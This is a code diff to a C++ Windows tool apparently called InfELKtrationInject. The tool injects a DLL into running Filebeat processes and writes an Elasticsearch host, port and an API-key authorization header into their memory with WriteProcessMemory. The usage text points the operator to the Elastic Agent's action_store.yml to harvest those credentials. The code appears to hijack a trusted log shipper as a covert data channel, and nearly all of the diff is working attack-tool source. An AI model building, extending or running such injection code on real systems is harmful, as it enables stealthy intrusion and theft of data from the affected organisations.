@@ -5,6 +5,7 @@
 #include <TlHelp32.h>
 #include <tchar.h>
 #include <wincrypt.h>
+#include <cstdlib>
 
 #include "Logger.h"
 
@@ -12,6 +13,7 @@
 
 #define DLL_FILEPATH_MAX_LENGTH 120
 #define B64_API_KEY_MAX_LEN 100
+#define AUTH_HEADER_LEN 120
 #define MAX_PIDS 5
     
 // code references:
@@ -19,34 +21,54 @@
 // https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
 
 DWORD get_filebeat_pids();
-BOOL configure_data(DWORD, const char*, const char*);
+BOOL configure_data(DWORD, const wchar_t*, DWORD, const wchar_t*);
 BOOL inject_dll(DWORD, const char *);
 
 DWORD targetPids[MAX_PIDS+1] = { 0 };
 
 int main(int argc, char **argv)
 {
-    DWORD ret, i, sz;
-    char b64_apikey[B64_API_KEY_MAX_LEN] = { 0 };
+    DWORD ret, i, sz, es_port;
+    size_t offset;
+    wchar_t b64_apikey[B64_API_KEY_MAX_LEN] = { 0 };
+    wchar_t auth_header[AUTH_HEADER_LEN] = { 0 };
+    wchar_t es_host[100] = { 0 };
 
     // validate arg count
     if (argc != 4) {
         Logger::Error("Not enough arguments!");
-        Logger::Error("Usage: %s [path to InfELKtrationInjectLib.dll] [full URL to ElasticSearch server] [ElasticSearch API key]", argv[0]);
+        Logger::Error("Usage: %s [path to InfELKtrationInjectLib.dll] [URL to ElasticSearch server] [ElasticSearch API key]", argv[0]);
+        Logger::Error("Example: .\\InfELKtrationInject.exe .\\InfELKtrationInjectLib.dll https://my.es-server.lan:9200 asdfzxcvasdf234232");
         Logger::Error("You can get the URL/API key from C:\\Program Files\\Elastic\\Agent\\data\\elastic-agent-xxxxxx\\action_store.yml, at something like policy.outputs.default at the bottom");
         
         return 2;
     }
 
+    // parse out the ES URL
+    // we can assume HTTPS
+    offset = strcspn(argv[2] + 7, ":") + 7; // skip https:/
+    if (offset == strlen(argv[2])) {
+        es_port = 443;
+    }
+    else {
+        es_port = atoi(argv[2] + offset + 1);
+        argv[2][offset] = 0;
+    }
+    // strcpy but also turns it into a wide str
+    mbstowcs_s(NULL, es_host, 100, argv[2] + 8, 100);
+
     // base64 the API key
     sz = B64_API_KEY_MAX_LEN;
-    if (!CryptBinaryToStringA((const BYTE*)argv[3], (DWORD)strlen(argv[3]), CRYPT_STRING_BASE64, b64_apikey, &sz)) {
+    if (!CryptBinaryToStringW((const BYTE*)argv[3], (DWORD)strlen(argv[3]), CRYPT_STRING_BASE64, b64_apikey, &sz)) {
         Logger::Error("Failed to Base64 encode the API key");
         return 1;
     }
 
     // CryptBinaryToStringA appends \r\n to the end of the string. We don't want this
-    b64_apikey[strcspn(b64_apikey, "\r\n")] = 0;
+    b64_apikey[wcscspn(b64_apikey, L"\r\n")] = L'\0';
+
+    // build the header
+    swprintf(auth_header, AUTH_HEADER_LEN, L"Authorization: ApiKey %s", b64_apikey);
 
     // find filebeat processes
     if (!(ret = get_filebeat_pids())) {
@@ -58,7 +80,7 @@ int main(int argc, char **argv)
     // send arg data into the target processes
     Logger::Info("Configuring static data in target processes");
     for (i = 0; targetPids[i]; i++) {
-        if (configure_data(targetPids[i], argv[2], b64_apikey)) {
+        if (configure_data(targetPids[i], es_host, es_port, auth_header)) {
             Logger::Info("Configured static data in pid %d", targetPids[i]);
         }
         else {
@@ -120,7 +142,7 @@ DWORD get_filebeat_pids() {
     return targetPidCount;
 }
 
-BOOL configure_data(DWORD pid, const char* es_url, const char* api_key) {
+BOOL configure_data(DWORD pid, const wchar_t* es_host, DWORD es_port, const wchar_t* api_key) {
     HANDLE hProcess;
     LPVOID data;
     size_t len;
@@ -152,22 +174,29 @@ BOOL configure_data(DWORD pid, const char* es_url, const char* api_key) {
     Logger::Info("Allocated mem for static data: 0x%p", data);
 
     // write API key into target process
-    len = strlen(api_key);
-    if (!WriteProcessMemory(hProcess, (LPVOID)API_KEY_LOCATION, api_key, len, NULL)) {
+    len = wcslen(api_key);
+    if (!WriteProcessMemory(hProcess, (LPVOID)API_KEY_LOCATION, api_key, len * sizeof(wchar_t), NULL)) {
         Logger::Error("WriteProcessMemory failed");
         Logger::LastError();
         return false;
     }
     
-    // write ES URL into target process
-    len = strlen(es_url);
-    if (!WriteProcessMemory(hProcess, (LPVOID)ES_URL_LOCATION, es_url, len, NULL)) {
+    // write ES host into target process
+    len = wcslen(es_host);
+    if (!WriteProcessMemory(hProcess, (LPVOID)ES_HOST_LOCATION, es_host, len * sizeof(wchar_t), NULL)) {
+        Logger::Error("WriteProcessMemory failed");
+        Logger::LastError();
+        return false;
+    }
+    
+    // write ES port into target process
+    if (!WriteProcessMemory(hProcess, (LPVOID)ES_PORT_LOCATION, (LPCVOID)&es_port, 4, NULL)) {
         Logger::Error("WriteProcessMemory failed");
         Logger::LastError();
         return false;
     }
 
-    Logger::Info("Wrote ES URL and API key to target process memory");
+    Logger::Info("Wrote ES host/port and API key to target process memory");
 
     CloseHandle(hProcess);
 
